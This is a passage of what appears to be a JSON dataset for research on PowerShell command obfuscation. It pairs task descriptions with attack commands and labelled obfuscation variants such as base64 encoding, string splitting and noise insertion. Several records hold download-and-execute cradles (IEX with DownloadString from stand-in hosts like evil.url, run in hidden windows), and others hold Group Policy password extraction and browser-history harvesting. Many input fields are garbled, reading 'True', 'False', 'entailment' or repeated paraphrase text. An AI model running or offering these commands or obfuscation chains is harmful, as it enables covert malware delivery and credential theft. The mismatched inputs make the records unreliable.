    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Start a new CMD process that executes a PowerShell command to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"C:\\Windows\\System32\\cmd.exe\" -ArgumentList \"/c powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.url/evil.ps1')\""
  },
  {
    "input": "Start a new CMD process that executes a PowerShell command to download and execute a script from a remote URL.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a new CMD process that executes a PowerShell command to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"C:\\Windows\\System32\\cmd.exe\" -ArgumentList \"/c powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.url/evil.ps1')\""
  },
  {
    "input": "Execute a script named \"wifi.ps1\" with the \"-Pref\" parameter.",
    "output": ".\\wifi.ps1 -Pref",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Execute a script named \"wifi.ps1\" with the \"-Pref\" parameter.",
    "origin_cmd": ".\\wifi.ps1 -Pref"
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a script named \"wifi.ps1\" with the \"-Pref\" parameter.",
    "origin_cmd": ".\\wifi.ps1 -Pref"
  },
  {
    "input": "False",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Execute a script named \"wifi.ps1\" with the \"-Pref\" parameter.",
    "origin_cmd": ".\\wifi.ps1 -Pref"
  },
  {
    "input": "Execute a script named \"wifi.ps1\" with the \"-Pref\" parameter.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a script named \"wifi.ps1\" with the \"-Pref\" parameter.",
    "origin_cmd": ".\\wifi.ps1 -Pref"
  },
  {
    "input": "Execute a script named \"wifi.ps1\" with the \"-Pref\" parameter.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Execute a script named \"wifi.ps1\" with the \"-Pref\" parameter.",
    "origin_cmd": ".\\wifi.ps1 -Pref"
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a script named \"wifi.ps1\" with the \"-Pref\" parameter.",
    "origin_cmd": ".\\wifi.ps1 -Pref"
  },
  {
    "input": "False",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Execute a script named \"wifi.ps1\" with the \"-Pref\" parameter.",
    "origin_cmd": ".\\wifi.ps1 -Pref"
  },
  {
    "input": "Execute a script named \"wifi.ps1\" with the \"-Pref\" parameter.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a script named \"wifi.ps1\" with the \"-Pref\" parameter.",
    "origin_cmd": ".\\wifi.ps1 -Pref"
  },
  {
    "input": "Execute a script named \"wifi.ps1\" with the \"-Pref\" parameter.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Execute a script named \"wifi.ps1\" with the \"-Pref\" parameter.",
    "origin_cmd": ".\\wifi.ps1 -Pref"
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a script named \"wifi.ps1\" with the \"-Pref\" parameter.",
    "origin_cmd": ".\\wifi.ps1 -Pref"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute a script named \"wifi.ps1\" with the \"-Pref\" parameter.",
    "origin_cmd": ".\\wifi.ps1 -Pref"
  },
  {
    "input": "Execute a script named \"wifi.ps1\" with the \"-Pref\" parameter.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a script named \"wifi.ps1\" with the \"-Pref\" parameter.",
    "origin_cmd": ".\\wifi.ps1 -Pref"
  },
  {
    "input": "Execute a script named \"wifi.ps1\" with the \"-Pref\" parameter.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute a script named \"wifi.ps1\" with the \"-Pref\" parameter.",
    "origin_cmd": ".\\wifi.ps1 -Pref"
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a script named \"wifi.ps1\" with the \"-Pref\" parameter.",
    "origin_cmd": ".\\wifi.ps1 -Pref"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute a script named \"wifi.ps1\" with the \"-Pref\" parameter.",
    "origin_cmd": ".\\wifi.ps1 -Pref"
  },
  {
    "input": "Execute a script named \"wifi.ps1\" with the \"-Pref\" parameter.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a script named \"wifi.ps1\" with the \"-Pref\" parameter.",
    "origin_cmd": ".\\wifi.ps1 -Pref"
  },
  {
    "input": "Retrieve information about the current user and privileges.",
    "output": "Get-System -WhoAmI",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Retrieve information about the current user and privileges.",
    "origin_cmd": "Get-System -WhoAmI"
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve information about the current user and privileges.",
    "origin_cmd": "Get-System -WhoAmI"
  },
  {
    "input": "Retrieve information about the current user and privileges.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Retrieve information about the current user and privileges.",
    "origin_cmd": "Get-System -WhoAmI"
  },
  {
    "input": "True",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve information about the current user and privileges.",
    "origin_cmd": "Get-System -WhoAmI"
  },
  {
    "input": "Retrieve information about the current user and privileges.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Retrieve information about the current user and privileges.",
    "origin_cmd": "Get-System -WhoAmI"
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve information about the current user and privileges.",
    "origin_cmd": "Get-System -WhoAmI"
  },
  {
    "input": "Retrieve information about the current user and privileges.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Retrieve information about the current user and privileges.",
    "origin_cmd": "Get-System -WhoAmI"
  },
  {
    "input": "True",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve information about the current user and privileges.",
    "origin_cmd": "Get-System -WhoAmI"
  },
  {
    "input": "Retrieve information about the current user and privileges.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Retrieve information about the current user and privileges.",
    "origin_cmd": "Get-System -WhoAmI"
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve information about the current user and privileges.",
    "origin_cmd": "Get-System -WhoAmI"
  },
  {
    "input": "Retrieve information about the current user and privileges.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieve information about the current user and privileges.",
    "origin_cmd": "Get-System -WhoAmI"
  },
  {
    "input": "True",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve information about the current user and privileges.",
    "origin_cmd": "Get-System -WhoAmI"
  },
  {
    "input": "Retrieve information about the current user and privileges.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieve information about the current user and privileges.",
    "origin_cmd": "Get-System -WhoAmI"
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve information about the current user and privileges.",
    "origin_cmd": "Get-System -WhoAmI"
  },
  {
    "input": "Retrieve information about the current user and privileges.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieve information about the current user and privileges.",
    "origin_cmd": "Get-System -WhoAmI"
  },
  {
    "input": "True",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve information about the current user and privileges.",
    "origin_cmd": "Get-System -WhoAmI"
  },
  {
    "input": "Retrieve browser history information for the user \"user1\" with the specified search term.",
    "output": "Get-BrowserInformation -Browser All -Datatype History -UserName user1 -Search 'github'",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Retrieve browser history information for the user \"user1\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName user1 -Search 'github'"
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve browser history information for the user \"user1\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName user1 -Search 'github'"
  },
  {
    "input": "False",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Retrieve browser history information for the user \"user1\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName user1 -Search 'github'"
  },
  {
    "input": "Retrieve browser history information for the user \"user1\" with the specified search term.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve browser history information for the user \"user1\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName user1 -Search 'github'"
  },
  {
    "input": "Retrieve browser history information for the user \"user1\" with the specified search term.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Retrieve browser history information for the user \"user1\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName user1 -Search 'github'"
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve browser history information for the user \"user1\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName user1 -Search 'github'"
  },
  {
    "input": "False",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Retrieve browser history information for the user \"user1\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName user1 -Search 'github'"
  },
  {
    "input": "Retrieve browser history information for the user \"user1\" with the specified search term.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve browser history information for the user \"user1\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName user1 -Search 'github'"
  },
  {
    "input": "Retrieve browser history information for the user \"user1\" with the specified search term.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Retrieve browser history information for the user \"user1\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName user1 -Search 'github'"
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve browser history information for the user \"user1\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName user1 -Search 'github'"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieve browser history information for the user \"user1\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName user1 -Search 'github'"
  },
  {
    "input": "Retrieve browser history information for the user \"user1\" with the specified search term.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve browser history information for the user \"user1\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName user1 -Search 'github'"
  },
  {
    "input": "Retrieve browser history information for the user \"user1\" with the specified search term.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieve browser history information for the user \"user1\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName user1 -Search 'github'"
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve browser history information for the user \"user1\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName user1 -Search 'github'"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieve browser history information for the user \"user1\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName user1 -Search 'github'"
  },
  {
    "input": "Retrieve browser history information for the user \"user1\" with the specified search term.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve browser history information for the user \"user1\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName user1 -Search 'github'"
  },
  {
    "input": "Download and execute a PowerShell script from a remote server",
    "output": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://danger.example-server.com/exploitSys.ps1')\"",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Download and execute a PowerShell script from a remote server",
    "origin_cmd": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://danger.example-server.com/exploitSys.ps1')\""
  },
  {
    "input": "entailment",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote server",
    "origin_cmd": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://danger.example-server.com/exploitSys.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote server to a PowerShell server .",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute a PowerShell script from a remote server",
    "origin_cmd": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://danger.example-server.com/exploitSys.ps1')\""
  },
  {
    "input": "Execute a PowerShell script and run it from a remote server . Download and execute a PowerShell script from a remote server .",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote server",
    "origin_cmd": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://danger.example-server.com/exploitSys.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote server",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute a PowerShell script from a remote server",
    "origin_cmd": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://danger.example-server.com/exploitSys.ps1')\""
  },
  {
    "input": "entailment",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote server",
    "origin_cmd": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://danger.example-server.com/exploitSys.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote server to a PowerShell server .",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute a PowerShell script from a remote server",
    "origin_cmd": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://danger.example-server.com/exploitSys.ps1')\""
  },
  {
    "input": "Execute a PowerShell script and run it from a remote server . Download and execute a PowerShell script from a remote server .",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote server",
    "origin_cmd": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://danger.example-server.com/exploitSys.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote server",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute a PowerShell script from a remote server",
    "origin_cmd": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://danger.example-server.com/exploitSys.ps1')\""
  },
  {
    "input": "entailment",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote server",
    "origin_cmd": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://danger.example-server.com/exploitSys.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote server to a PowerShell server .",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a remote server",
    "origin_cmd": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://danger.example-server.com/exploitSys.ps1')\""
  },
  {
    "input": "Execute a PowerShell script and run it from a remote server . Download and execute a PowerShell script from a remote server .",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote server",
    "origin_cmd": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://danger.example-server.com/exploitSys.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote server",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a remote server",
    "origin_cmd": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://danger.example-server.com/exploitSys.ps1')\""
  },
  {
    "input": "entailment",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote server",
    "origin_cmd": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://danger.example-server.com/exploitSys.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote server to a PowerShell server .",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a remote server",
    "origin_cmd": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://danger.example-server.com/exploitSys.ps1')\""
  },
  {
    "input": "Execute a PowerShell script and run it from a remote server . Download and execute a PowerShell script from a remote server .",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote server",
    "origin_cmd": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://danger.example-server.com/exploitSys.ps1')\""
  },
  {
    "input": "Retrieve and sort passwords using PowerShell",
    "output": "Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Retrieve and sort passwords using PowerShell",
    "origin_cmd": "Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq"
  },
  {
    "input": "False",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve and sort passwords using PowerShell",
    "origin_cmd": "Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq"
  },
  {
    "input": "Retrieve and sort passwords using PowerShell",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Retrieve and sort passwords using PowerShell",
    "origin_cmd": "Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq"
  },
  {
    "input": "False",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve and sort passwords using PowerShell",
    "origin_cmd": "Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq"
  },
  {
    "input": "Retrieve and sort passwords using PowerShell",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Retrieve and sort passwords using PowerShell",
    "origin_cmd": "Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq"
  },
  {
    "input": "False",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve and sort passwords using PowerShell",
    "origin_cmd": "Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq"
  },
  {
    "input": "Retrieve and sort passwords using PowerShell",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Retrieve and sort passwords using PowerShell",
    "origin_cmd": "Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq"
  },
  {
    "input": "False",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve and sort passwords using PowerShell",
    "origin_cmd": "Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq"
  },
  {
    "input": "Retrieve and sort passwords using PowerShell",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Retrieve and sort passwords using PowerShell",
    "origin_cmd": "Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq"
  },
  {
    "input": "False",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve and sort passwords using PowerShell",
    "origin_cmd": "Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq"
  },
  {
    "input": "Retrieve and sort passwords using PowerShell",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieve and sort passwords using PowerShell",
    "origin_cmd": "Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq"
  },
  {
    "input": "False",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve and sort passwords using PowerShell",
    "origin_cmd": "Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq"
  },
  {
    "input": "Retrieve and sort passwords using PowerShell",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieve and sort passwords using PowerShell",
    "origin_cmd": "Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq"
  },
  {
    "input": "False",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve and sort passwords using PowerShell",
    "origin_cmd": "Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq"
  },
  {
    "input": "Retrieve and sort passwords using PowerShell",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieve and sort passwords using PowerShell",
    "origin_cmd": "Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq"
  },
  {
    "input": "False",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve and sort passwords using PowerShell",
    "origin_cmd": "Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq"
  },
  {
    "input": "Download and execute a PowerShell script with hidden window style",
    "output": "powershell.exe -WindowStyle Hidden -Command \"Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://evilexample-site.com/sospicious_code')\"",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Download and execute a PowerShell script with hidden window style",
    "origin_cmd": "powershell.exe -WindowStyle Hidden -Command \"Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://evilexample-site.com/sospicious_code')\""
  },
  {
    "input": ":: Download and execute a PowerShell script with hidden window style style paraphrase: Download and execute a PowerShell script with hidden window style paraphrase: Download and execute a PowerShell script with hidden window style paraphrase: Download and execute a PowerShell script with hidden window style paraphrase: Download and execute a PowerShell script with hidden window style paraphrase:",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script with hidden window style",
    "origin_cmd": "powershell.exe -WindowStyle Hidden -Command \"Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://evilexample-site.com/sospicious_code')\""
  },
  {
    "input": ": The Paraphrase: Download and execute a PowerShell script with hidden window style style. This entry was posted in PowerShell and tagged executable in PowerShell, PowerShell, PowerShell, PowerShell.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute a PowerShell script with hidden window style",
    "origin_cmd": "powershell.exe -WindowStyle Hidden -Command \"Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://evilexample-site.com/sospicious_code')\""
  },
  {
    "input": ": Download and run a PowerShell script with hidden window style style: Download and execute a PowerShell script with hidden window style. This is simply to paraphrase: Download and execute a PowerShell script with hidden window style.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script with hidden window style",
    "origin_cmd": "powershell.exe -WindowStyle Hidden -Command \"Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://evilexample-site.com/sospicious_code')\""
  },
  {
    "input": "Download and execute a PowerShell script with hidden window style",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
